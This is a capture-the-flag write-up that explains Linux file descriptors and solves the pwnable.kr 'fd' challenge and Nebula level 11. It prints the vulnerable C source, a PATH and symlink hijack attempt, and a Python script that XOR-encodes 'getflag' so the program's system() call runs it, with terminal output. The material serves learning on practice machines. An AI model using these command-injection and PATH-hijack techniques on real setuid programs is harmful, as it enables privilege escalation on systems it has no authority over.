## File Desciptor

**Linux File Descriptor** [ [Wiki](https://en.wikipedia.org/wiki/File_descriptor) ]

```
stdin  -> 0
stdout -> 1
stderr -> 2
```
**open() in C**
```
int open(const char ***_pathname_**, int** _flags_**);
#Example
int fd;
fd=open("file_path",O_RDWR);
```
**read() in C**
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main()
{
        char buf[4];
        int fd;
        int len=0;
        fd=open("lol.txt",O_RDWR);
        len=read(fd,buf,4);
        printf("Buf = %s",buf);
        return 0;
}

```
**Pwnable . kr** [ FD ]
fd.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```
Running Program
```
fd@pwnable:~$ ./fd 1
learn about Linux file IO
```
- 1 - 0x1234 ( 4660 in Decimal ) = fd
-  read from buf ( No assignment for buf )
- If buf is equal to "LETMEWIN\n", print out the flag

Idea
```
4660 - 4660 = 0 -> stdin
4661 - 4660 = 1 -> stdout
4662 - 4660 = 2 -> stderror
```
Test
```
fd@pwnable:~$ ./fd 4662
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@pwnable:~$ ./fd 4661
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@pwnable:~$ ./fd 4665
learn about Linux file IO
```
**Nebula Level 11** [ [Description](https://exploit-exercises.lains.space/nebula/level11/) ]

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));

  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
```
There are two ways to solve this challenge and we will use Command Injection Technique in Part 1.

Basically it has three functions
 - main() -> Start here
 - getrand() -> Randomize user input 
 - process() -> execute `buf` as shell command by system()

Test Running
```
level11@nebula:~$ /home/flag11/flag11
aaaa
flag11: invalid header

#Source Code Review
if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }
```
We have to use `#define CL "Content-Length: "` 

Run again
```
level11@nebula:/home/flag11$ ./flag11
Content-Length: 1\na

sh: $'\v\260u': command not found
```
Its called process() and Xored our input.
```
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nh" | ./flag11
sh: i: command not found
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nh" | ./flag11
sh: $'i\200\222': command not found
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nh" | ./flag11
sh: $'ip\221': command not found
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nh" | ./flag11
sh: $'i\360\023': command not found
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nh" | ./flag11
sh: i: command not found
```
**Symlink Method** ( Not Work )  

We noticed `h` changed to `i` for sometimes ( Symlink idea to execute getflag as flag11 user )

```
#getflag Location
/bin/getflag
#Symlink between m and getflag
cd /tmp
ln -s /bin/getflag m
#Export /tmp into PATH 
export PATH=/tmp:$PATH
```
When system() execute `m` , getflag will exeucte becasue we did symlink.
```
level11@nebula:/home/flag11$ echo -e "Content-Length: 1\nl" | ./flag11
getflag is executing on a non-flag account, this doesn't count
```
Nah! Doesn't count.

**Xor Method** 
```
#Size of Buf
char buf[1024];
#If length less than 1024, call process
if(length < sizeof(buf))
#If length not less than 1024, do the following
blue = length
fd = random path
while blue > 0
	pink = read (1 byte of buf)
	if pink <= 0
		read failed error
	write(fd,buf,pink)
	blue -= pink
mem = memory mapping ( fd )
process ( mem )
```
Test Running
```
#Hit condition 1
level11@nebula:/home/flag11$ echo -e "Content-Length: 1024\nl" | ./flag11
blue = 1024, length = 1024, pink = 2
blue = 1022, length = 1024, pink = 0
flag11: fread fail(blue = 1022, length = 1024): Bad file descriptor

#Hit Condition 2
level11@nebula:/home/flag11$ python -c'print "Content-Length: 1024\n"+"A"*1024' | ./flag11
blue = 1024, length = 1024, pink = 1024
flag11: mmap: Bad file descriptor
```
When mmap() hit , bad file descriptor error because of xor encryption
**mmap() - map files or devices into memory**
```
void *mmap(void ***_addr_**, size_t** _length_**, int** _prot_**, int** _flags_**,****int** _fd_**, off_t** _offset_**);
```
Nebula
```
mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
system(mem);
```
Now we clearly know our goal. 
 - We have to make pink and blue into 1024
 - Then program will write our input into file ( random files )
 - And then program will map from files to memory
 - Execute data from memory

Export Temp and Test Run
```
export TEMP=/tmp

level11@nebula:~$ python -c 'print "Content-Length: 1024\n"+"getflag\x00"+"A"*1018' | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
sh: $'g\374\351\322\2165x\247A\376\200': command not found

```
Trying to execute getflag but failed by Xor

11 .py
```
command = "getflag\x00"
length = 1024
key = length & 0xff

encrypted=""
for i in range(len(command)):
        enc = (ord(command[i])^key) & 0xff;
        encrypted += chr(enc)
        key = (key - ord(command[i])) & 0xff;

print "Content-Length: 1024\n"+encrypted+"A"*(length-len(encrypted))
```
Test
```
level11@nebula:~$ python 11.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn't count
```

**Important** 

> Above methods are not real solution for Nebula 11 and I found a real
> solution [here](https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9) and this is next topic



**Reference**
- [https://my.eng.utah.edu/~cs4400/file-descriptor.pdf](https://my.eng.utah.edu/~cs4400/file-descriptor.pdf)
- [https://www.pwntester.com/blog/2013/11/24/nebula-level11-write-up/](https://www.pwntester.com/blog/2013/11/24/nebula-level11-write-up/)
- 
